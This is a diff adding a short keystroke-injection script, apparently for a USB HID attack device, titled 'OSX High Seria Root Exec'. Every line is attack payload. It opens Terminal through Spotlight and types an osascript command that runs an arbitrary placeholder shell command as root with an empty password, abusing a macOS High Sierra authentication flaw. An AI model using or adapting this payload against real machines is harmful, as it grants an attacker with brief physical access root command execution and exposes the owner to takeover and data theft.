@@ -1,0 +1,10 @@
+Rem:Title: OSX High Seria Root Exec (COMMAND+SPACE)
+CustomDelay:1000
+Press:131+32
+Print:terminal
+CustomDelay:500
+Press:176
+CustomDelay:3000
+Print:osascript -e 'do shell script \"%s\" with administrator privileges user name \"root\" password \"\"'
+CustomDelay:500
+Press:176
